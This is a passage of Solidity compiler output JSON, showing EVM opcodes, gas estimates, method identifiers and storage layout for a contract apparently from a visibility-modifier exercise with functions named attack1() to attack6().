JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH2 0x997 PUSH0 DUP4 PUSH2 0x97F JUMP JUMPDEST SWAP2 POP PUSH2 0x9A2 DUP3 PUSH2 0x989 JUMP JUMPDEST PUSH0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x9B6 DUP3 PUSH2 0x98C JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x63616C6C206661696C6564000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xA04 PUSH1 0xB DUP4 PUSH2 0x9C0 JUMP JUMPDEST SWAP2 POP PUSH2 0xA0F DUP3 PUSH2 0x9D0 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA31 DUP2 PUSH2 0x9F8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA42 DUP3 PUSH2 0x8EC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xA52 DUP2 PUSH2 0xA38 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA84 PUSH2 0xA7F PUSH2 0xA7A DUP5 PUSH2 0xA58 JUMP JUMPDEST PUSH2 0x90B JUMP JUMPDEST PUSH2 0xA61 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xA94 DUP2 PUSH2 0xA6A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0xAAD PUSH0 DUP4 ADD DUP7 PUSH2 0xA49 JUMP JUMPDEST PUSH2 0xABA PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0xA8B JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x40 DUP4 ADD MSTORE PUSH2 0xACC DUP2 DUP5 PUSH2 0x894 JUMP JUMPDEST SWAP1 POP SWAP5 SWAP4 POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG1 0x4C DUP10 0xE1 XOR DUP8 PUSH20 0x921603B9C4DB526FAF7613493A0C9CAA4B0AF513 PUSH13 0x873A27B564736F6C6343000815 STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "565600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack1()": "infinite",
						"attack2()": "infinite",
						"attack3()": "infinite",
						"attack4()": "infinite",
						"attack5()": "infinite",
						"attack6()": "infinite",
						"complete()": "infinite",
						"figure()": "infinite",
						"fun()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack1()": "419efc03",
					"attack2()": "9fcec698",
					"attack3()": "b2b9f26d",
					"attack4()": "12a50b25",
					"attack5()": "dc5bb9a1",
					"attack6()": "e4832009",
					"complete()": "522e1177",
					"figure()": "13b6ae4c",
					"fun()": "946644cd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 4,
						"contract": "shoot/2/可见性修饰符/1.sol:fig",
						"label": "fun",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(check)711"
					}
				],
				"types": {
					"t_contract(check)711": {
						"encoding": "inplace",
						"label": "contract check",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}